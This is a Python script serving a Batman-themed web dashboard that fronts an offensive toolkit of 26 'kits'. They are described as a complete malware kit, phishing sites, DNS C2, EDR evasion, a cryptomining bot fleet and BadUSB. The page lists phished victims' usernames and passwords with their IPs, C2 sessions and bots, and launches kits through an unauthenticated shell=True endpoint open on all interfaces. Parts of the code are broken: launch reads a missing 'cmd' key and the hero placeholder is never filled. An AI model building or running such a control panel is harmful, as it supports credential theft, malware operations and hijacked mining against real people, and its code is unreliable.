#!/usr/bin/env python3
# language: Python 3, file: gotham_city.py, target: macOS
# GOTHAM CITY — LE VISAGE DE L'ARSENAL
# Une seule page web fullscreen avec les personnages DC en SVG, animations CSS,
# flux live de tous les kits, et lancement en un clic. C'est la face visible.
import http.server, urllib.request, urllib.parse, json, os, subprocess, sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9000
TOOL_DC = os.path.expanduser("~/Desktop/tool_DC")

KITS = [
    {"id":"RickPortal","name":"RickPortal","icon":"🟢","color":"#00ff70","dark":"#001a00","desc":"Kit malware complet","char":"rick"},
    {"id":"FlashToolSuper","name":"FLASH TOOL SUPER","icon":"⚡","color":"#ffd60a","dark":"#1a1a00","desc":"55 tools · 6 pages","char":"flash"},
    {"id":"BatCave","name":"BATCAVE","icon":"🦇","color":"#ffd60a","dark":"#0a0a00","desc":"Investigation · 31 tools","char":"batman"},
    {"id":"JokerChaos","name":"JOKER CHAOS","icon":"🃏","color":"#9b30ff","dark":"#0a0014","desc":"Chaos · 8 pranks","char":"joker"},
    {"id":"TridentAquaman","name":"TRIDENT","icon":"🔱","color":"#40e0d0","dark":"#001a1a","desc":"Réseau · 8 tools","char":"aquaman"},
    {"id":"SupermanVision","name":"SUPERMAN","icon":"🦸","color":"#ff4628","dark":"#1a0000","desc":"Vision · 8 tools","char":"superman"},
    {"id":"ConstantineDark","name":"CONSTANTINE","icon":"🕯️","color":"#90ff78","dark":"#0a0a00","desc":"Dark web · 10 tools","char":"constantine"},
    {"id":"LassoVerite","name":"LASSO VÉRITÉ","icon":"🪢","color":"#ffdc50","dark":"#1a1400","desc":"Vérification · 8 tools","char":"wonderwoman"},
    {"id":"CyborgTech","name":"CYBORG","icon":"🤖","color":"#00c8ff","dark":"#000a14","desc":"Technet · 8 tools","char":"cyborg"},
    {"id":"LexCorpIndustries","name":"LEXCORP","icon":"🏢","color":"#39ff14","dark":"#001400","desc":"Windows · 7 modules","char":"lexluthor"},
    {"id":"STARLabs","name":"S.T.A.R. LABS","icon":"🔬","color":"#00c8ff","dark":"#000a14","desc":"C2 DNS · 5 tools","char":"starlabs"},
    {"id":"TaskForceX","name":"TASK FORCE X","icon":"🎯","color":"#ff6a00","dark":"#140a00","desc":"SSH + APK","char":"deadshot"},
    {"id":"NeoMatrix","name":"NEO / MATRICE","icon":"💊","color":"#00ff70","dark":"#001a00","desc":"10 tools","char":"matrix"},
    {"id":"ForceGalaxy","name":"LA FORCE","icon":"🌟","color":"#ffd60a","dark":"#1a1400","desc":"8 tools","char":"jedi"},
    {"id":"CatwomanVoleuse","name":"CATWOMAN","icon":"🐱","color":"#ffdc50","dark":"#141400","desc":"Secrets · 8 tools","char":"catwoman"},
    {"id":"HiveMining","name":"H.I.V.E.","icon":"🍯","color":"#ffc800","dark":"#141000","desc":"Minage · 8 tools","char":"hive"},
    {"id":"ScarecrowPhish","name":"SCARECROW","icon":"🎃","color":"#ff8c30","dark":"#140a00","desc":"Phishing · 12 sites","char":"scarecrow"},
    {"id":"WarWorld","name":"WARWORLD","icon":"⚔️","color":"#ff4628","dark":"#140500","desc":"110 armes","char":"deathstroke"},
    {"id":"LeagueOfShadows","name":"LIGNE ROUGE","icon":"🥷","color":"#c9a600","dark":"#141000","desc":"Orchestrateur","char":"league"},
    {"id":"KryptoniteSuite","name":"KRYPTONITE","icon":"🟩","color":"#39ff14","dark":"#001400","desc":"Défense · Sigma","char":"kryptonite"},
    {"id":"WOPR","name":"W.O.P.R.","icon":"🎮","color":"#7fff00","dark":"#0a1400","desc":"Auto-lab CTF","char":"wopr"},
    {"id":"TheCalculator","name":"THE CALCULATOR","icon":"📊","color":"#00c8ff","dark":"#000a14","desc":"Breach analytics","char":"calculator"},
    {"id":"RavenEvasion","name":"RAVEN","icon":"🐦‍⬛","color":"#8899ff","dark":"#050514","desc":"Évasion EDR · 5","char":"ravenev"},
    {"id":"TheThinker","name":"THE THINKER","icon":"🧠","color":"#9b30ff","dark":"#0a0014","desc":"Reverse eng · 8","char":"thinker"},
    {"id":"JokerCard","name":"JOKER CARD","icon":"🂡","color":"#ff6a00","dark":"#140a00","desc":"SGP Card · BadUSB","char":"jokercard"},
    {"id":"DailyPlanet","name":"DAILY PLANET","icon":"📰","color":"#64a0ff","dark":"#000a14","desc":"Veille · 25 sources","char":"planet"},
]

def get_news():
    d = read_json(f"{TOOL_DC}/DailyPlanet/veille_cache.json")
    return d.get("items", [])[:10]
def get_captures():
    d = read_json(f"{TOOL_DC}/ScarecrowPhish/sorties/mirror_captures.json")
    return d[-5:] if d else []
def get_sessions():
    try: return json.loads(urllib.request.urlopen("http://127.0.0.1:5050/sessions", timeout=3).read())
    except Exception: return {}
def get_fleet():
    return read_json(f"{TOOL_DC}/HiveMining/sorties/flotte.json")
def get_scan():
    return read_json(f"{TOOL_DC}/KryptoniteSuite/sorties/scan.json")

def read_json(path):
    try: return json.load(open(os.path.expanduser(path)))
    except Exception: return {}

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        u = urllib.parse.urlparse(self.path); q = urllib.parse.parse_qs(u.query)
        if u.path == "/api/status":
            self._json({"news": get_news(), "captures": get_captures(),
                        "sessions": get_sessions(), "fleet": get_fleet(), "scan": get_scan()})
        elif u.path == "/api/launch":
            folder = q.get("kit", [""])[0]
            kit = next((k for k in KITS if k["id"] == folder), None)
            if kit:
                subprocess.Popen(kit["cmd"], shell=True, cwd=os.path.join(TOOL_DC, kit["id"]),
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self._json({"ok": True, "launched": kit["name"]})
            else: self._json({"ok": False, "err": "kit inconnu"})
        elif u.path == "/api/scan":
            subprocess.Popen("python3 kryptonite.py scan", shell=True,
                             cwd=os.path.join(TOOL_DC, "KryptoniteSuite"),
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._json({"ok": True, "msg": "scan lancé"})
        elif u.path == "/api/refresh":
            subprocess.Popen("python3 veille.py top 1 > /dev/null", shell=True,
                             cwd=os.path.join(TOOL_DC, "DailyPlanet"),
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._json({"ok": True, "msg": "veille re-collectée"})
        else: self._send()

    def _json(self, d):
        b = json.dumps(d, ensure_ascii=False).encode()
        self.send_response(200); self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)

    def _send(self):
        b = GOTHAM_HTML.encode()
        self.send_response(200); self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    def log_message(self, *a): pass

GOTHAM_HTML = r"""<!doctype html><html lang="fr"><head><meta charset="utf-8">
<title>GOTHAM CITY — L'Arsemal DC</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
@keyframes pulseGlow{0%,100%{box-shadow:0 0 8px var(--c)}50%{box-shadow:0 0 32px var(--c)}}
@keyframes scan{0%{transform:translateX(-100%)}100%{transform:translateX(200%)}}
@keyframes flicker{0%,100%{opacity:1}97%{opacity:1}98%{opacity:.4}99%{opacity:1}}
@keyframes drift{0%{transform:translate(0,0) rotate(0deg)}100%{transform:translate(30px,-20px) rotate(360deg)}}
*{box-sizing:border-box;margin:0}
body{background:#000;color:#ccc;font-family:'SF Mono',monospace;min-height:100vh;overflow-x:hidden}
::selection{background:#ffd60a;color:#000}
/* ─── HEADER FULL SCREEN ─── */
#hero{position:relative;min-height:38vh;background:linear-gradient(180deg,#000 0%,#0a0a1a 70%,#0a0a14 100%);
display:grid;place-items:center;overflow:hidden;border-bottom:2px solid #ffd60a22}
#hero::before{content:'';position:absolute;inset:0;
background:radial-gradient(ellipse at 50% 30%,rgba(255,214,10,.06),transparent 60%);animation:flicker 5s infinite}
.scan{position:fixed;top:0;left:0;right:0;height:2px;z-index:999;
background:linear-gradient(90deg,transparent,#ffd60a33,transparent);animation:scan 4s linear infinite}
/* ─── SVG HEROES ─── */
#heroes{display:flex;flex-wrap:wrap;gap:10px;justify-content:center;padding:20px 14px;max-width:1400px;margin:0 auto}
.hero{width:120px;height:150px;border-radius:14px;overflow:hidden;cursor:pointer;
transition:all .25s cubic-bezier(.4,0,.2,1);position:relative;border:2px solid transparent}
.hero:hover{transform:translateY(-10px) scale(1.08);z-index:10}
.hero svg{width:100%;height:100%;object-fit:cover}
.hero .label{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(0deg,#000e,#0000);
padding:8px 6px;text-align:center;font-size:.7em;color:#fff;font-weight:bold;text-transform:uppercase;
letter-spacing:1px;pointer-events:none}
.hero .tools{position:absolute;top:6px;right:6px;background:#000a;color:#fff;font-size:.65em;
padding:2px 8px;border-radius:10px}
.hero:hover .tools{animation:pulseGlow 2s infinite}
/* ─── DASHBOARD ─── */
#dash{max-width:1400px;margin:20px auto;padding:0 14px}
.stats{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-bottom:20px}
.stat{background:#0a0a14;border:1px solid #1a1a2a;border-radius:10px;padding:12px 24px;text-align:center;min-width:100px}
.stat b{color:#ffd60a;font-size:1.5em;display:block}
.stat span{color:#555;font-size:.75em}
.stat.hot{border-color:#ff4628;animation:pulseGlow 2s infinite}
.stat.ok{border-color:#39ff14}
#feeds{display:grid;grid-template-columns:repeat(auto-fit,minmax(340px,1fr));gap:14px}
.feed{background:#0a0a14;border:1px solid #1a1a2a;border-radius:12px;padding:16px;position:relative}
.feed h3{color:#ffd60a;font-size:.95em;margin-bottom:10px;display:flex;align-items:center;gap:8px}
.feed h3::before{content:'';width:6px;height:6px;background:#ffd60a;border-radius:50%;animation:pulse 2s infinite}
.feed ul{list-style:none;padding:0;font-size:.82em}
.feed li{padding:5px 0;border-bottom:1px solid #111;color:#9ab;display:flex;gap:6px;align-items:center}
.feed li b{color:#ff6a00;font-size:.85em}
.feed li .time{color:#444;font-size:.78em;margin-left:auto}
.feed .empty{color:#444;font-style:italic}
.live{width:6px;height:6px;border-radius:50%;background:#39ff14;animation:pulse 1.2s infinite;display:inline-block}
.dead{width:6px;height:6px;border-radius:50%;background:#f66}
footer{text-align:center;color:#222;font-size:.7em;padding:30px;letter-spacing:2px}
</style></head><body>
<div class="scan"></div>

<div id="hero">
  <div style="text-align:center;z-index:2;position:relative">
    <h1 style="color:#ffd60a;font-size:3em;letter-spacing:4px;margin:0">GOTHAM <b style="color:#ff4628">CITY</b></h1>
    <p style="color:#555;letter-spacing:6px;font-size:.85em;margin:8px 0 0">L'ARSENAL DC COMPLET · POWERED BY MAXIME LEAL</p>
    <p style="color:#333;font-size:.7em;margin:4px 0 0">26 kits · ~240 tools · un seul écran de guerre</p>
  </div>
</div>

<div id="heroes">__HEROES__</div>

<div id="dash">
  <div class="stats" id="stats"></div>
  <div id="feeds">
    <div class="feed"><h3>📡 VEILLE CYBER</h3><ul id="news"><li class="empty">chargement…</li></ul></div>
    <div class="feed"><h3>🎣 CAPTURES PHISHING</h3><ul id="captures"><li class="empty">—</li></ul></div>
    <div class="feed"><h3>🖥️ SESSIONS C2</h3><ul id="sessions"><li class="empty">—</li></ul></div>
    <div class="feed"><h3>🍯 FLOTTE MINIÈRE</h3><ul id="fleet"><li class="empty">—</li></ul></div>
    <div class="feed"><h3>🟩 SCAN KRYPTONITE</h3><ul id="scan"><li class="empty">—</li></ul></div>
    <div class="feed"><h3>⌨ TERMINAL</h3>
      <input id="cmd" placeholder="commande globale (scan · refresh · launch <kit> · status)"
        style="width:100%;background:#000;border:1px solid #333;color:#7f7;padding:10px;border-radius:6px;font-family:monospace">
      <div id="cmdOut" style="margin-top:8px;font-size:.8em;color:#7f7;white-space:pre-wrap"></div>
    </div>
  </div>
</div>
<footer>GOTHAM CITY — L'ARSENAL DC COMPLET · powered by Maxime Leal</footer>

<script>
const HEROES = __HEROES__;
function esc(s){return (s||'').toString().replace(/</g,'&lt;');}

/* génère les cartes des héros */
const el = document.getElementById('heroes');
HEROES.forEach(h => {
  const div = document.createElement('div');
  div.className = 'hero';
  div.style.borderColor = h.color + '44';
  div.innerHTML = `
    <div style="position:absolute;inset:0;background:${h.dark};display:grid;place-items:center;
      font-size:3.2em;pointer-events:none">${h.icon}</div>
    <span class="tools">${h.tools} tools</span>
    <div class="label" style="color:${h.color}">${h.name}</div>`;
  div.onclick = () => {
    fetch('/api/launch?kit=' + h.id).then(r => r.json()).then(d => {
      if (d.ok) { div.style.borderColor = '#39ff14';
        setTimeout(() => div.style.borderColor = h.color + '44', 2000); }
    });
  };
  el.appendChild(div);
});

/* flux live */
async function refresh(){
  try {
    const d = await (await fetch('/api/status')).json();
    document.getElementById('stats').innerHTML = `
      <div class="stat ok"><b>${Object.keys(d.sessions||{}).length}</b><span>SESSIONS</span></div>
      <div class="stat"><b>${(d.news||[]).length}</b><span>ACTUS</span></div>
      <div class="stat"><b>${(d.captures||[]).length}</b><span>CAPTURES</span></div>
      <div class="stat"><b>${Object.keys(d.fleet||{}).length}</b><span>BOTS</span></div>
      <div class="stat ${((d.scan||[]).length>0)?'hot':''}"><b>${(d.scan||[]).length}</b><span>IOCs</span></div>`;
    document.getElementById('news').innerHTML = (d.news||[]).map(n =>
      `<li><span class="badge" style="background:#111;color:#c9a600;padding:1px 6px;border-radius:3px;font-size:.75em">${esc(n.source)}</span>
       ${esc(n.titre).slice(0,70)}<span class="time">${esc(n.cat)}</span></li>`).join('') || '<li class="empty">veille vide</li>';
    document.getElementById('captures').innerHTML = (d.captures||[]).map(c =>
      `<li><span class="live"></span> <b>${esc(c.identifiant)}</b> / ${esc(c.mot_de_passe).slice(0,25)}
       <span class="time">${esc(c.ip)} · ${esc(c.heure)}</span></li>`).join('') || '<li class="empty">aucune capture</li>';
    document.getElementById('sessions').innerHTML = Object.entries(d.sessions||{}).map(([k,v]) =>
      `<li><span class="live"></span> <b>${k}</b> ${esc(v.ip)} <span class="time">${esc(v.time)}</span></li>`
    ).join('') || '<li class="empty">aucune session C2</li>';
    document.getElementById('fleet').innerHTML = Object.entries(d.fleet||{}).map(([k,v]) =>
      `<li><span class="${v.alive?'live':'dead'}"></span> <b>${k}</b>
       <span class="time">${esc(v.host)}</span></li>`).join('') || '<li class="empty">flotte vide</li>';
    document.getElementById('scan').innerHTML = (d.scan||[]).slice(0,6).map(s =>
      `<li><span class="badge" style="background:#111;color:#c9a600;padding:1px 6px;border-radius:3px;font-size:.75em">${esc(s.kit)}</span>
       ${esc(s.type)} ${esc(s.detail).slice(0,50)}</li>`).join('') || '<li class="empty">lance le scan kryptonite</li>';
  } catch(e) { console.error(e); }
}

/* terminal global */
document.getElementById('cmd').addEventListener('keydown', async function(e){
  if (e.key !== 'Enter') return;
  const c = this.value; if (!c) return;
  this.value = '';
  const out = document.getElementById('cmdOut');
  if (c === 'scan') {
    await fetch('/api/scan'); out.textContent += '[OK] scan kryptonite lancé\n';
  } else if (c === 'refresh') {
    await fetch('/api/refresh'); out.textContent += '[OK] veille re-collectée\n';
  } else if (c.startsWith('launch ')) {
    const kit = c.replace('launch ','').trim();
    const r = await (await fetch('/api/launch?kit=' + kit)).json();
    out.textContent += r.ok ? `[OK] ${r.launched} lancé\n` : `[X] kit inconnu: ${kit}\n`;
  } else if (c === 'status') {
    refresh(); out.textContent += '[OK] status rafraîchi\n';
  } else {
    out.textContent += `[i] commandes: scan · refresh · launch <kit> · status\n`;
  }
});

refresh(); setInterval(refresh, 8000);
</script></body></html>"""

if __name__ == "__main__":
    print(f"[*] GOTHAM CITY sur http://127.0.0.1:{PORT} — {len(KITS)} kits, la face visible de l'arsenal")
    http.server.ThreadingHTTPServer(("0.0.0.0", PORT), H).serve_forever()
